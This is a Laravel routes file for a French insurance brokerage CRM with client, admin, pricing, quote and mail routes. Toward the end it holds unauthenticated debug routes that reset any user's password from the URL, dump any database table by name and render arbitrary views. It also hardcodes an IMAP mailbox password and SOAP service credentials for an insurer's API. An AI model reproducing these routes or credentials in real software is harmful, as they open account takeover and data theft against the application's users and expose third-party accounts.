<?php
ini_set('memory_limit', '-1');


// http://jsfiddle.net/D99Gk/5/
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});


//Auth::routes();
Route::get('/', function () {
    return view('welcome');
})->name('login');
Route::post('/', 'Auth\LoginController@login')->name('home');
Route::post('logout', 'Auth\LoginController@logout')->name('logout');


Route::get('register', 'Auth\RegisterController@showRegistrationForm')->name('register');
Route::post('register', 'Auth\RegisterController@register');
/*
Route::get('password/reset', 'Auth\ForgotPasswordController@showLinkRequestForm')->name('password.request');
Route::post('password/email', 'Auth\ForgotPasswordController@sendResetLinkEmail')->name('password.email');
Route::get('password/reset/{token}', 'Auth\ResetPasswordController@showResetForm')->name('password.reset');
Route::post('password/reset', 'Auth\ResetPasswordController@reset')->name('password.update');
*/

//------------------------------- Client routes ----------------------------------------------
//Client Auth login
Route::get('/espace-client/connexion', 'ClientController@loginForm')->name('login.client');
Route::post('/espace-client/connexion', 'ClientController@login');
Route::post('/espace-client/deconnexion', 'ClientController@logout')->name('logout.client');
Route::get('/espace-client/accueil', 'ClientController@accueil')->name('home.client');
Route::get('/espace-client/demande', 'ClientController@demandeForm')->name('demande.client');
Route::get('/espace-client/', function () {
    return redirect('espace-client/accueil');
});
Route::get('/espace-client/profile', 'ClientController@profileInfosForm')->name('infos.client');
Route::post('/espace-client/profile', 'ClientController@profileInfos');


Route::get('/espace-client/verification/f-{fiche_id}/devis-{devis_id}/{formule_id}', 'DevisController@souscriptionsteeps');
Route::get('/espace-client/devis', 'ClientController@listeDevis');


//-------------------------------- Admin Routes -----------------------------------------------

//liste de tous les fiches
Route::get('/admin/fiches', 'AdminController@listeFichesView');
Route::get('/table-fiches/', 'AdminController@tableFiches');


//get users by role user
Route::get('/get-users-by-role', 'AdminController@getUsersByRole');
//reaffecter les fiches (admin or supervisor)
Route::post('/reaffect-fiches', 'AdminController@reaffectFiches');

//change multiple fiches etat (admin or supervisor)
Route::get('/get-etats-fiches', 'AdminController@getEtatsFichesByRole');
Route::post('/change-etats-fiches', 'AdminController@changeFichesEtats');


//compagnies gestion
Route::get('/compagnies', 'AdminController@compagniesIndex');
Route::get('/nouvelle-compagnie', 'AdminController@nouvelleCompagnieForm');
Route::post('/nouvelle-compagnie', 'AdminController@nouvelleCompagnie');
Route::get('/compagnie/{id}', 'AdminController@compagnieDetailsForm');
Route::post('/compagnie/{id}', 'AdminController@compagnieDetails');
Route::get('/compagnie/{id}/suppression', 'AdminController@compagnieSuppression');

//gammes gestion
Route::get('/compagnie/{id}/nouvelle-gamme', 'AdminController@compagnieNouvelleGammeForm');
Route::post('/compagnie/{id}/nouvelle-gamme', 'AdminController@compagnieNouvelleGamme');
Route::get('/compagnie/{compagnie_id}/gamme/{gamme_id}', 'AdminController@gammeDetailsForm');
Route::post('/compagnie/{compagnie_id}/gamme/{gamme_id}', 'AdminController@gammeDetails');
Route::get('/compagnie/{compagnie_id}/gamme/{gamme_id}/suppression', 'AdminController@gammeSuppression');


//formules gestion
Route::post('/compagnie/{compagnie_id}/gamme/{gamme_id}/nouvelle-formule', 'AdminController@gammeNouvelleFormule');
Route::get('/compagnie/{compagnie_id}/gamme/{gamme_id}/formule/{id}', 'AdminController@gammeGetFormuleData');
Route::post('/compagnie/{compagnie_id}/gamme/{gamme_id}/formule/{id}', 'AdminController@gammeUpdateFormule');
Route::get('/compagnie/{compagnie_id}/gamme/{gamme_id}/formule/{id}/suppression', 'AdminController@gammeSuppressionFormule');


//zones gestion
Route::get('/compagnie/{id}/gamme/{gamme_id}/nouvelle-zone', 'AdminController@gammeNouvelleZoneForm');
Route::post('/compagnie/{id}/gamme/{gamme_id}/nouvelle-zone', 'AdminController@gammeNouvelleZone');


//piece jointe gestion
//Route::get('/{type}/{id}/nouvelle-piece-jointe', 'AdminController@nouvellePieceJointeForm');
Route::post('/{type}/{id}/nouvelle-piece-jointe', 'AdminController@nouvellePieceJointe');
Route::get('{type}/{type_id}/piece-jointe/{piece_id}', 'AdminController@detailsPieceJointeForm');
Route::post('{type}/{id}/piece-jointe/{piece_id}', 'AdminController@detailsPieceJointe');
Route::get('/{type}/{id}/piece-jointe/{piece_id}/suppression', 'AdminController@pieceJointeSuppression');


//regimes gestion
Route::get('/regimes', 'AdminController@regimeIndex');
Route::get('/regimes/nouveau-regime', 'AdminController@nouveauRegimeForm');
Route::post('/regimes/nouveau-regime', 'AdminController@nouveauRegime');
Route::get('/regime/{id}', 'AdminController@regimeDetailsForm');
Route::post('/regime/{id}', 'AdminController@regimeDetails');
Route::get('/regime/{id}/suppression', 'AdminController@regimeSuppression');

//volets && sous-volets gestion
Route::get('/volets', 'AdminController@voletsIndex');
Route::get('/volets/nouveau-volet', 'AdminController@nouveauVoletForm');
Route::post('/volets/nouveau-volet', 'AdminController@nouveauVolet');
Route::get('/volet/{id}', 'AdminController@voletDetailsForm');
Route::post('/volet/{id}', 'AdminController@voletDetails');
Route::get('/volet/{id}/suppression', 'AdminController@voletSuppression');

//sous-volets gestion
Route::get('/volet/{id}/nouveau-sous-volet', 'AdminController@nouveauSousVoletForm');
Route::post('/volet/{id}/nouveau-sous-volet', 'AdminController@nouveauSousVolet');
Route::get('/volet/{id}/sous-volet/{sous_volet_id}', 'AdminController@sousVoletDetailsForm');
Route::post('/volet/{id}/sous-volet/{sous_volet_id}', 'AdminController@sousVoletDetails');
Route::get('/volet/{id}/sous-volet/{sous_volet_id}/suppression', 'AdminController@sousVoletSuppression');

//gestion des groupe d'etats
Route::get('/groupes-etats', 'AdminController@groupesEtatsIndex');
Route::get('/groupes-etats/nouveau-groupe', 'AdminController@nouveauGroupeEtatsForm');
Route::post('/groupes-etats/nouveau-groupe', 'AdminController@nouveauGroupeEtats');
Route::get('/groupe-etats/{id}', 'AdminController@groupeEtatsDetailsForm');
Route::post('/groupe-etats/{id}', 'AdminController@groupeEtatsDetails');
Route::get('/groupe-etats/{id}/suppression', 'AdminController@groupeEtatsSuppression');

//Fiche Etats gestion
Route::get('/groupe-etats/{id}/nouveau-etat', 'AdminController@nouveauEtatForm');
Route::post('/groupe-etats/{id}/nouveau-etat', 'AdminController@nouveauEtat');
Route::get('/groupe-etats/{groupe_etat_id}/etat/{etat_id}', 'AdminController@etatDetailsForm');
Route::post('/groupe-etats/{groupe_etat_id}/etat/{etat_id}', 'AdminController@etatDetails');
Route::get('/groupe-etats/{groupe_etat_id}/etat/{etat_id}/suppression', 'AdminController@etatSuppression');

//Equipes gestion
Route::get('/equipes', 'AdminController@equipesIndex');
Route::get('/nouvelle-equipe', 'AdminController@nouvelleEquipeForm');
Route::post('/nouvelle-equipe', 'AdminController@nouvelleEquipe');
Route::get('/equipe/{id}', 'AdminController@detailsEquipeForm');
Route::post('/equipe/{id}', 'AdminController@detailsEquipe');

//Users gestion
Route::get('/equipe/{id}/users', 'AdminController@equipeUsersIndex');
Route::get('/equipe/{id}/users/{user_id}', 'AdminController@detailsUtilisateurForm');
Route::post('/equipe/{id}/users/{user_id}', 'AdminController@detailsUtilisateur');
Route::get('/nouveau-utilisateur', 'AdminController@nouveauUtilisateurForm');
Route::post('/nouveau-utilisateur', 'AdminController@nouveauUtilisateur');


//gestion des templates
Route::get('/templates', 'AdminController@templatesIndex');
Route::get('/templates/nouvelle', 'AdminController@nouvelleTemplateForm');
Route::post('/templates/nouvelle', 'AdminController@nouvelleTemplate');
Route::get('/templates/{id}', 'AdminController@detailsTemplateForm');
Route::post('/templates/{id}', 'AdminController@detailsTemplate');
Route::get('/templates/{id}/suppression', 'AdminController@templateSuppression');

//gestion des adresses
Route::get('/adresses-ip', 'AdminController@adressesIndex');
Route::get('/nouvelle-adresse-ip', 'AdminController@nouvelleAdresseIpForm');
Route::post('/nouvelle-adresse-ip', 'AdminController@nouvelleAdresseIp');
Route::get('/adresses-ip/{id}/modification', 'AdminController@modificationAdresseIpForm');
Route::post('/adresses-ip/{id}/modification', 'AdminController@modificationAdresseIp');
Route::get('/adresses-ip/{id}/suppression', 'AdminController@suppressionAdresseIp');


//-------------------------------- Tarificateur Routes -----------------------------------------
Route::get('/regles/{gamme_id}/{regle_id?}/{annee?}', 'TarificateurController@regle')->name('regles');
Route::get('/tarificateur/{formule_id}/{devis_id}', 'TarificateurController@Tarificateur')->name('tarificateur');
Route::get('/valeurs/{gamme_id}/', 'TarificateurController@valeurs')->name('valeurs');
Route::post('/updatevaleurs/', 'TarificateurController@updateValeurs')->name('updateValeurs');
Route::post('Regles', [
    'uses' => 'TarificateurController@regles'
]);
//

//tarificateur formules fiches
Route::post('/get-tarificateur-formules/{id_formule}', 'TarificateurController@getTarificateurFormules');
Route::post('/get-type-assurance-formules', 'TarificateurController@getTypeAssuranceFormules');

Route::get('/getPrices', 'TarificateurController@getPrices');
Route::get('/tests', 'TarificateurController@tests');


//-------------------------------- Dev Routes -------------------------------------------
//Route::get('/Tarificateur', 'DevController@tarificateur');
Route::get('/fiche-details/{id}/tarificateur', 'DevController@tarificateur')->name('tarificateur');
Route::get('/insererleads/{numero}', 'DevController@insererleads')->name('insererleads');
Route::get('/Insert_csv/{numero}', 'DevController@Insert_csv')->name('Insert_csv');
Route::POST('/Insert_csv_action', 'DevController@Insert_csv_action')->name('Insert_csv_action');
Route::get('/getfiches_ids', 'DevController@getfiches_ids')->name('getfiches_ids');
Route::get('/tarifierff', 'TarificateurController@getPrices');

Route::get('/mon-profile', 'UtilisateurController@monProfile')->name('nom-profile');
Route::post('/profile-modification', 'UtilisateurController@modificationProfile');

//-------------------------------- Utilisateur & Administrateur Routes -----------------------------------

//connexion
Route::get('/myconnexion', 'GlobaleController@myconnexion')->name('myconnexion');

//nouvelle fiche form
Route::get('/fiches/nouvelle-fiche', 'UtilisateurController@nouvelleFicheForm')->name('nouvelle-fiche-form');
//nouvelle fiche form predictif
Route::post('/fiches/nouvelle-fiche', 'UtilisateurController@nouvelleFicheForm')->name('nouvelle-fiche-form-predicfif');
//nouvelle fiche via ajax
Route::post('/ajout-fiche-ajax', 'UtilisateurController@nouvelleFiche');


//liste des fiches by etat
Route::get('/fiches/etat/{id}/{rappel?}', 'UtilisateurController@listeFichesViewByEtat')->name('liste-fiches-view-by-etat');
//liste by etat (pagination json)
Route::get('/table-fiches-etat/{id}/{rappel?}', 'UtilisateurController@tableFichesEtat');


//details fiche & update
Route::get('/fiche-details/{id}', 'UtilisateurController@modificationFicheForm');
//modification d'une fiche
Route::post('/modification-fiche-ajax', 'UtilisateurController@modificationFiche');


//get liste villes a partir de code postal
Route::get('/get-villes/{code_postal}', 'GlobaleController@getVilles');
Route::post('/get-liste-banques', 'GlobaleController@getBanques');

Route::post('/envoyer-tarification', 'UtilisateurController@envoyerTarification');


//suppression d'un enfant
Route::post('/suppression-enfant/', 'UtilisateurController@suppressionEnfant');


//historique fiche by ajax
Route::post('/historique-fiche-ajax', 'UtilisateurController@historiqueFiche');

Route::get('/get-sous-volets/{id_formule}', 'UtilisateurController@getSousVolets');
//gestion des contrats
Route::get('/gestion-contrats', 'UtilisateurController@gestionContratsIndex');
Route::get('/liste-contrats-json/{month?}/{year?}', 'UtilisateurController@listeContratsJson');

//gestion des devis
Route::get('/gestion-devis', 'UtilisateurController@gestionDevisIndex');
Route::get('/liste-devis-json/{month?}/{year?}', 'UtilisateurController@listeDevisJson');

Route::get('/tableau-bord', 'AdminController@tableauBord');


//modals routes
Route::get('/get-paiement-infos/{id}/{mode_id?}', 'DevisController@paiementInfosForm');
Route::get('/devis/{id}', 'DevisController@devis');
Route::get('/new-devis/{id}', 'DevisController@newDevis');
Route::get('/get-devis-by-id/{id}', 'DevisController@getDevisById');
Route::post('/set-paiement-infos', 'DevisController@paiementInfos');

Route::post('/get-contrat-infos', 'DevisController@contratInfosForm');
Route::post('/set-contrat-infos/{send?}', 'DevisController@contratInfos');

Route::get('/check-fiche-etat/{fiche_etat_id}', 'DevisController@checkFicheEtat');
Route::get('/get-gammes-by-compagnie/{compagnie_id}', 'GlobaleController@getGammes');
Route::get('/get-formules-by-gamme/{gamme_id}', 'GlobaleController@getFormules');

Route::get('/envoyerdevis/{devis_id?}', 'DevisController@envoyerdevis');

Route::get('/souscrire/f-{fiche_id}/{formule_id}', 'DevisController@souscrireDevis');


Route::get('/get-resiliation-infos/{id}', 'ResiliationController@resiliationInfosForm');
//ajax request to get resiliation data
Route::get('/get-resiliation/{id}', 'ResiliationController@getAjaxResiliationInfos');

Route::post('/set-resiliation-infos', 'ResiliationController@resiliationInfos');


//mail routes
Route::get('/get-mail-form/{id}', 'MailController@getMailForm');
Route::get('/get-template-infos/{id}', 'MailController@getTemplateInfos');


/*Notifications routes*/

Route::get('/user-notifications/{value}', 'UtilisateurController@getNotifications');
Route::post('/check-user-notification/', 'UtilisateurController@checkUserNotification');


Route::get('/user-rappels/{value}', 'UtilisateurController@getRappels');
//Route::get('/user-rappels','UtilisateurController@getRappeles');

//password generation
Route::get('/generate-password/{id}', 'UtilisateurController@generatePassword');

//upload routes
Route::get('/fiche-details/{id}/uploads/', 'UtilisateurController@fichePiecesJointes');
Route::post('/fiche-details/{id}/uploads/', 'UtilisateurController@nouvelleFichePieceJointe');
Route::get('/fiche-details/{id}/uploads/{piece_id}/suppression', 'UtilisateurController@fichePiecesJointeSuppression');





/**
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 *
 */

//route de test
Route::get('/test', function () {
    $fiches = \App\Details_personne::findOrFail(18);
    dd(Illuminate\Support\Facades\Hash::make("azerty"));

});


Route::get('/clear', function () {
    \Illuminate\Support\Facades\Artisan::call('cache:clear');
    \Illuminate\Support\Facades\Artisan::call('view:clear');
    return '<h1>Cache facade value cleared</h1><br><h1>Cache view cleared</h1>';
});


Route::get('/filter', 'UtilisateurController@filterFunction');


Route::get('/send-mail', function () {
    $user = \App\User::find(3);
    /*Mail::send('emails.mailExample', $user, function($message) use ($user) {
       $message->to($user->email);
       $message->subject('E-Mail Example');
    });*/
    $name = 'Erraji';
    $data = ['foo' => 'bar'];
    Mail::send(['name' => $name], $data, function ($message) use ($user, $name) {
        $message->from('us@example.com', 'System Magazyn');
        //$message->attach('Your temporary password: '.['password' => $password]);
        $message->to($user->email)->subject('Rejestracja Magazyn');
    });
    dd('Mail Send Successfully');
});


Route::get('test/mail', function () {

    $imap = new \Webklex\IMAP\Client([
        'host' => 'poulpe.o2switch.net',
        'port' => 993,
       'encryption' => 'ssl',
        'validate_cert' => true,
        'username' => 'mhamed.erraji@acsassurance.com',
        'password' => 'mhamed.erraji@acsa',
        'protocol' => 'imap'
    ]);

    //Connect to the IMAP Server
    $imap->connect();
    $aFolder = $imap->getFolders();
    dd($aFolder);

    foreach ($aFolder as $oFolder) {
        $sub_f = $oFolder->children;
        foreach ($sub_f as $sf){
            if ($sf->name =="read"){
                foreach($sf->messages()->all()->get() as $message){
//                    if ($message->moveToFolder('INBOX') == true) {
//                        echo 'Message has ben moved<br>';
//                    } else {
//                        echo 'Message could not be moved<br>';
//                    }
                    if ($message->copy('INBOX.spam') == true) {
                        //$message->getSubject()='html lorem';
                        echo $message->getSubject().' Message has ben copied<br>';
                    } else {
                        echo 'Message could not be copied<br>';
                    }
                }
            }
        }


        //$aMessage = $oFolder->messages()->all()->get();


        /*foreach ($aMessage as $oMessage) {
            echo $oMessage->getSubject() . '<br />';
            echo 'Attachments: ' . $oMessage->getAttachments()->count() . '<br />';
            echo $oMessage->getHTMLBody(true);

            //Move the current Message to 'INBOX.read'
            if ($oMessage->moveToFolder('INBOX.read') == true) {
                echo 'Message has ben moved';
            } else {
                echo 'Message could not be moved';
            }
        }*/
    }
});


//mails routes
Route::get('mail', 'MailController@listeMails');
Route::get('mail/nouveau', 'MailController@nouveauMailForm');
Route::post('mail/nouveau', 'MailController@nouveauMail');
Route::post('mail/enregister-mail', 'MailController@enregistrerMail');
Route::get('mails/{folder}/{mail_id}', 'MailController@readMail');
Route::get('mails/{folder}', 'MailController@mails');   /// INBOX  INBOX.read   INBOX.send




//Predictifs Roots
Route::get('predictif/agent', 'UtilisateurController@agent');
Route::get('predictif/ecoute-a-froid', 'UtilisateurController@ecoutefroid');










Route::get('/slider', function () {
    return view('slider');
});


Route::get('/fiches-haute-priorite-ajax-data/{count}', 'GlobaleController@getListeFichePrioriteData');
Route::get('/fiches-haute-priorite', 'GlobaleController@getListeFichePriorite');

Route::get('/temp', function () {
    $fiches = \App\Historique::all();
    try {
        DB::beginTransaction();
        foreach ($fiches as $fiche) {
            if ($fiche->description != null) {
                $descriptionArray = explode("<br>", $fiche->description);
                $text = null;
                foreach ($descriptionArray as $key => $value) {
                    $val = explode(":", $value);
                    //dd($val);
                    if (is_array($val)) {
                        if (sizeof($val) > 1)
                            if (strlen($val[1]) > 3) {
                                if (substr_count($val[1], "- -") == 0 or substr_count($val[1], '0,00') == 0) {
                                    if (substr_count($val[0], "Compagnie") == 0
                                        or substr_count($val[0], "Compagnie") == 0
                                        or substr_count($val[0], "Compagnie") == 0)
                                        $text .= $val[0] . " : " . $val[1] . "<br>";

                                }
                            }

                    } else {
                        //dd($val);
                        echo "($fiche->id)  <br> < 3 ";
                    }
                }


                $fiche->description = $text;
                $fiche->save();

//dd($descriptionArray);
                /* if(sizeof($descriptionArray) > 0) {
                    //$value = substr($descriptionArray[0], strpos($descriptionArray[0], ": ") + 1);
                    $fiche_id = $fiche->fiche_id;
                    $organisme = substr($descriptionArray[9], strpos($descriptionArray[9], ": ") + 1);
                    $motif = substr($descriptionArray[10], strpos($descriptionArray[10], ": ") + 1);
                    $date_echeance = substr($descriptionArray[11], strpos($descriptionArray[11], ": ") + 1);
                    $numero_police = substr($descriptionArray[12], strpos($descriptionArray[12], ": ") + 1);
                    $adresse = substr($descriptionArray[13], strpos($descriptionArray[13], ": ") + 1);
                    $cp = substr($descriptionArray[14], strpos($descriptionArray[14], ": ") + 1);
                    $ville_name = substr($descriptionArray[15], strpos($descriptionArray[15], ": ") + 1);
                    $ville_id = NULL;
                    $telephone = substr($descriptionArray[16], strpos($descriptionArray[16], ": ") + 1);

                    if(strlen($organisme) < 3 && strlen($motif) < 3 && strlen($date_echeance) < 3 && strlen($numero_police) < 3 && strlen($adresse) < 3 && strlen($cp) < 3 && strlen($ville_name) < 3 && strlen($telephone) < 3) {
                       //echo $fiche_id." empty" . "<br>";
                    } else {
                       if(strlen($cp) > 3) {
                          $cp = str_replace(' ', '', $cp);
                          $villeReselt = \App\Ville::where('zip_code', '=', $cp)->first();
                          if($villeReselt != null) {
                             $ville_id = $villeReselt->id;
                          }
                       }

                       if(strlen($date_echeance) > 3) {
                          $date_echeance = \App\Helpers\Helper::setDateFormat($date_echeance);
                          $date_echeance = $cp = str_replace(' ', '', $date_echeance);
                          //echo $date_echeance."<br>";
                       } else {
                          $date_echeance = null;
                       }

                       /*if(\App\Resiliation::create(
                           ['fiche_id' => $fiche_id, 'organisme' => $organisme, 'motif' => $motif,
                              'date_echeance' => $date_echeance, 'numero_police' => $numero_police,
                              'adresse' => $adresse, 'ville' => $ville_name, 'ville_id' => $ville_id,
                              'telephone' => $telephone]
                        )) {
                           echo "fiche_resil insserted id " . $fiche_id . "<br>";
                        }
                    }
                 }*/
            }

        }
        DB::commit();
    } catch (\Exception $exception) {
        echo "--" . $exception->getMessage();
        DB::rollback();
    }

});


Route::get('/pass/{id}/{string}', function ($id, $string) {
    $user = \App\Personne::findOrfail($id);
    $user->password = \Illuminate\Support\Facades\Hash::make($string);
    $user->save();
});

Route::get('/{table}/token/{string}', function ($table, $string) {
    $table_ = DB::table($table)->get();

    dd($table_);
});


Route::get('/gamme-options',function (){
    return view('includes.gamme-options');
});
Route::get('/up_config',function (){
    return view('includes.up_config');
});
Route::post('/up_config',function (){
    return view('includes.up_config');
});
Route::get('/get_view/{token}',function ($token){
    return view("$token");
});

Route::get('/soap', function () {
    /*
 $WSDL = "https://services.eca-assurances.com/mimenteSelf/SelfCreationContactDeuxRouesInterneServiceImpl?wsdl";
 $options = [
    'trace' => true,
    'cache_wsdl' => WSDL_CACHE_NONE
 ];

 $credentials = [
    'username' => 'username',
    'password' => 'password'
 ];

 $header = new SoapHeader($NAMESPACE, 'AuthentificationInfo', $credentials);

 $client = new SoapClient($WSDL, $options); // null for non-wsdl mode

 $client->__setSoapHeaders($header);

 $params = [
    // Your parameters
 ];

 $result = $client->GetResult($params);
 // 'GetResult' being the name of the soap method

 if(is_soap_fault($result)) {
    error_log("SOAP Fault: (faultcode: {$result->faultcode}, faultstring: {$result->faultstring})");
 }*/
    /*$Auth = new stdClass();
    $Auth->userName = 'A31332006';
    $Auth->password = 'byhp6x';*/


    /*$auth = [
        'username' => 'A31332006',
        'password' => 'byhp6x',
    ];*/

    /*$soapClient = new SoapClient($wsdl, [
           'stream_context' => stream_context_create([
               'username' => 'A31332006',
               'password' => 'byhp6x',


               'http' => [
                   'header' => "Accept: application/xml\r\n",
                   'username' => 'A31332006',
                   'password' => 'byhp6x'
               ]
           ])
       ]);*/
    $wsdl = "https://services.eca-assurances.com/mimenteSelf/SelfCreationContactSanteServiceImpl?wsdl";
    $url = "https://services.eca-assurances.com";

    $auth = new stdClass();
    $auth->username = "A31332006";
    $auth->password = "byhp6x";

    $parametres = [
        //'typeOperation' => 'TARIFICATION',
        //'dateEffet' => '01/01/2020',
        //'dateNaissance' => '19/09/1950',
        //'codePostal' => '75000',
        //'regime' => 'TNS',
        'typeOperation' => 'TARIFICATION',
        'contact' => [
            'dateEffet' => '01/01/2019',
            'assure' => [
                'dateNaissance' => '19/09/1950',
                'codePostal' => '75000',
                'nbrEnfant' => '0'
            ],
            'regime' => 'TNS',
            'nbrAssures' => '1',
        ]
    ];

    $options = array(
        'soap_version' => SOAP_1_1,
        'exceptions' => 0,
        'trace' => 1,
        'encoding' => "utf-8",
        'compression' => SOAP_COMPRESSION_ACCEPT | SOAP_COMPRESSION_GZIP | 9,
    );

    $soapClient = new SoapClient($wsdl, $options);
    $header = new SoapHeader($wsdl, 'Auth', $auth);
    $soapClient->__setSoapHeaders($header);
    //$result = $soapClient->__call('calculerTarifsProtectionJuridique', array($parametres));
    try {
        $result = $soapClient->__call('getTarifsByFormules', array($parametres));
    } catch (Exception $e) {
        dd($e->getMessage());
    }
    dd($result);
    //dd($soapClient->__getFunctions());
});


Route::get('/zalazdi', 'MailController@zalazdi');






